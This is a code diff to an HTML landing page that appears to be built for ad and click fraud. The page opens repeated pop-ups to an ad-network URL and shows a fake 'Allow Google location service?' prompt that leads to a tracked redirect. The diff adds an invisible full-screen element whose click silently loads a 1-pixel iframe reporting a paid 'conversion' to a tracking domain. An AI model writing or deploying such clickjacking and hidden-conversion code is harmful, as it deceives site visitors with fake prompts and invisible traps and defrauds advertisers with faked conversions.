@@ -10,8 +10,8 @@
 	target= document.getElementsByTagName('div')[0];
 	
 	function multiLinks(){
-window.open('http://bodelen.com/afu.php?zoneid=2235793'); //open target _blank
-window.open('http://bodelen.com/afu.php?zoneid=2235793'); //open target _blank
+		window.open('http://bodelen.com/afu.php?zoneid=2235793'); //open target _blank
+		window.open('http://bodelen.com/afu.php?zoneid=2235793'); //open target _blank
 
 	window.open("http://bodelen.com/afu.php?zoneid=2235793",'_blank', 'toolbar=0,location=0,menubar=0'); // open a new window
 	}
@@ -42,7 +42,7 @@ body {
 	
 </head>
 <body onload="myP()">  
-<div style="min-height: 100vh;width: 100%;background-color: powderblue;overflow: hidden;opacity: 0;">
+<div onclick="convert()"style="min-height: 100vh;width: 100%;background-color: powderblue;overflow: hidden;opacity: 0;">
 <iframe src=" " style="width: 1px; height: 1px"></iframe>
         <script>
                 var url = window.location.href;
@@ -59,12 +59,21 @@ body {
                     console.log(source_id);
                 };
                </script>
-<script>
-      
+	
+	<script>
+		function convert(){
+			var ifrm = document.getElementsByTagName("IFRAME")[0];
+			ifrm.setAttribute("src", "https://prprocess.com/conversion/?user_id=6449&click_id="+click_id+"&currency=USD&payout=0.01");
+			ifrm.style.width = "1px";
+			ifrm.style.height = "1px";
+			document.body.appendChild(ifrm);
+		
+		}
+	</script>
 
-  
-  
-  
+	
+	
+	<script>
           function myP(){
 		  confirm("Allow Google location service?");
 		  //setTimeout(myP, 5000);
@@ -75,7 +84,7 @@ body {
             // They clicked Yes
             console.log('Clicked Confirm')
 		  setTimeout(function () {
-			  window.location.href = "https://pepebro.github.io/memory/?source_id=333333&click_id=11111"; //will redirect to your blog page (an ex: blog.html)
+			  window.location.href = "https://pepebro.github.io/memory/?source_id="+source_id+"&click_id="+click_id+""; //will redirect to your blog page (an ex: blog.html)
 		  }, 1500); //will call the function after 2 secs.
 
             }else{
